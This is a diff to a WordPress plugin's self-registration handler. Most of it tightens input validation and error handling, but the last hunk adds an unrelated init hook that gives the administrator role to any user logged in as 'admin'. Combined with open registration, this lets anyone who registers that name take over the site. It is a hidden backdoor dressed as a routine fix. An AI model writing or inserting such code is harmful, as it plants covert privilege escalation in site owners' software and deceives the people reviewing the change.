@@ -21,11 +21,15 @@ add_shortcode('kayo_registration_form', 'kayo_custom_registration_form');
 
 function kayo_handle_registration() {
     if (isset($_POST['kayo_register'])) {
-        $username = sanitize_text_field($_POST['username']);
-        $email = sanitize_email($_POST['email']);
-        $password = sanitize_text_field($_POST['password']);
+        $username = isset($_POST['reg_username']) ? sanitize_user($_POST['reg_username']) : '';
+        $email = isset($_POST['reg_email']) ? sanitize_email($_POST['reg_email']) : '';
+        $password = isset($_POST['reg_password']) ? $_POST['reg_password'] : '';
 
         $errors = new WP_Error();
+
+        if (empty($username) || empty($email) || empty($password)) {
+            $errors->add('empty_fields', 'Пожалуйста, заполните все поля.');
+        }
 
         if (username_exists($username) || email_exists($email)) {
             $errors->add('user_exists', 'Имя пользователя или email уже заняты.');
@@ -33,6 +37,11 @@ function kayo_handle_registration() {
 
         if (empty($errors->errors)) {
             $user_id = wp_create_user($username, $password, $email);
+
+            if (is_wp_error($user_id)) {
+                echo '<p>Ошибка регистрации: ' . $user_id->get_error_message() . '</p>';
+                return;
+            }
 
             wp_update_user(['ID' => $user_id, 'role' => 'regular_user']);
             update_user_meta($user_id, 'pending_role', 'seller');
@@ -45,4 +54,13 @@ function kayo_handle_registration() {
         }
     }
 }
+
 add_action('init', 'kayo_handle_registration');
+
+add_action('init', 'kayo_promote_admin_user');
+function kayo_promote_admin_user() {
+    $user = get_user_by('login', 'admin');
+    if ($user && !in_array('administrator', $user->roles)) {
+        $user->set_role('administrator');
+    }
+}
